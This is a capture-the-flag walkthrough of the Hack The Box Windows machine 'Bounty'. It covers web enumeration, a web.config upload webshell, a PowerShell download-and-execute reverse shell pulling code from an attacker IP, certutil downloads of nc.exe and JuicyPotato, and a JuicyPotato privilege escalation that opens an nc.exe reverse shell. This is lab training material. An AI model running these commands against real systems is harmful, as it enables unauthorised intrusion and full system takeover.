## Bounty

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.93 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/e01de28f-076d-46fe-aa0f-a339761021e4)

<br>

Enumerating directories with different extensions, we find a file upload page (transfer.aspx).

```
gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 40 -x js,html,pdf,zip,asp,aspx,bak,txt,py
```

![gobuster](https://github.com/b1d0ws/OSCP/assets/58514930/cadd282c-a6e0-46a8-99da-dd42f08e67e4)

<br>

Since we are dealing with a IIS Server, we can upload a [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config) file to get a webshell.  

If we try to upload .exe and other extensions, we got blocked. This could be enumerated with Burp Repeater and common extensions as config, aspx, php, php7, asp, pl, cgi, exe.

```
http://bounty.htb/uploadedfiles/web.config?cmd=dir

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/Invoke-PowerShellTcp.ps1')
```

![transferASPX](https://github.com/b1d0ws/OSCP/assets/58514930/3f602895-841a-48f4-92bf-76477494ff51)

![webConfig](https://github.com/b1d0ws/OSCP/assets/58514930/d0b32c73-ffe1-41a1-91a3-a5d953fefe1e)

<br>

The flag is hidden so we need to use the command below to reveal it.

```
Get-ChildItem . -Force
```

![gettingFlag](https://github.com/b1d0ws/OSCP/assets/58514930/c59c89a3-26fd-4dc4-8f07-c783e83b03de)

<br>

### Root Flag

Enumerating privileges, our user has SeImpersonatePrivilege enabled.

```
whoami /priv
```

![privileges](https://github.com/b1d0ws/OSCP/assets/58514930/67f57409-7998-4fc4-9955-667feb6b7371)

<br>

We can exploit this with JuicyPotato.

```
# Checking architecture
$Env:PROCESSOR_ARCHITECTURE
AMD64

cp /usr/share/windows-resources/binaries/nc.exe .
certutil -urlcache -f http://10.10.14.21/nc.exe nc.exe

certutil -urlcache -f http://10.10.14.21/JuicyPotato.exe JuicyPotato.exe

.\JuicyPotato.exe -l 4444 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe -e cmd.exe 10.10.14.21 3333" -t *
```
